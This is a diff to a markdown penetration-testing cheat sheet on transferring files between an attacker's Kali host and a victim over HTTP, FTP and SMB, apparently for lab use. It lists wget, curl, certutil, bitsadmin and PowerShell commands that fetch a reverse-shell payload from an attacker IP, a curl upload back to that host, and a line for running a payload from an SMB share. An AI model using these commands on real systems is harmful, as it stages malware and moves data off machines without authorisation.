@@ -3,17 +3,44 @@
 # Transfering files
 ## HTTP
 
-| Sending Linux    | Receiving Linux | Receiving Windows |
-| -------- | ------- | ------- |
-| python3 -m http.server 8080  | wget http://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>) <br> curl http://<kali_IP>:<Port_number>/<file> (-o /path/to/dir/<file>) | certutil -urlcache -split -f "" [output-file] <br> powershell -c (new-object System.Net.WebClient).DownloadFile('http://<kali_IP>:<Port_number>/<file>,'C:\path\to\<file>') <br> to instantly execute it: ...|
+### Method 1
 
+#### Sender
 
+`python3 -m http.server 8000`
 
-Sending to Linux:
+#### Receiver
+##### Linux
+`wget http://10.10.10.79:8000/rev_shell.sh -O /tmp/rev_shell.sh`
+(<file> can be just the file name to save to current location, or a full path)
+`curl http://10.10.10.79:8000/rev_shell.sh -o /tmp/rev_shell.sh`
 
-https://gist.github.com/fabiand/5628006
-SimpleHTTPPutServer.py
+##### Windows
+`curl http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
+(we need to mention the -o (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., WebResponseObject.)
+`certutil -urlcache -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
+`certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
+(The -split option in certutil is used to split large files into smaller segments to perform the file transfer.)
+`bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe`
+(Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files.)
+`powershell wget http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
+`powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.79:8000/rev_shell.exe', 'rev_shell.exe')`
+instantly execute it:
+``
 
+### Method 2
+
+#### Sender
+
+`curl -T rev_shell.exe http://10.10.10.79:8000`
+
+#### Receiver
+
+python3 -m SimpleHTTPPutServer 8080
+
+[SimpleHTTPPutServer.py](https://gist.github.com/fabiand/5628006)
+
+```
 # python3 -m SimpleHTTPPutServer 8080
 
 from http.server import HTTPServer, SimpleHTTPRequestHandler
@@ -36,9 +63,10 @@ def run(server_class=HTTPServer, handler_class=PutHTTPRequestHandler):
 
 if __name__ == '__main__':
     run()
+```
 
 
-curl -T <file> http://<kali_IP>:<Port_number>
+
 
 ## FTP
 Kali -> Victim
@@ -49,6 +77,29 @@ Kali -> Victim
 | python3 -m pytfplib -w -p <Port_number>
 
 ## SMB
+
+#### Sender
+`impacket-smbserver share .`
+`impacket-smbserver share $(pwd) -smb2support`
+( Here we are giving the shared directory name as share, the significance of the share here is that it converts the file’s long path into a single share directory. Here we can give the full path of directory or the pwd as argument so that it takes the current directories path.)
+
+#### Receiver
+
+```
+smbclient -L 192.168.31.141
+smbclient "\\\\192.168.31.141\share"
+ls
+get ignite.txt
+put data.txt
+```
+
+`impacket-smbclient`
+
+`copy ignite.txt \\192.168.31.141\share\ignite.txt`
+
+to instantly execute it: `powershell -c (\\<kali_IP\<server_name>\<payload)`
+
+or just copy: `copy \\192.168.31.141\share\ignite.txt`
 
 Kali -> Victim
 
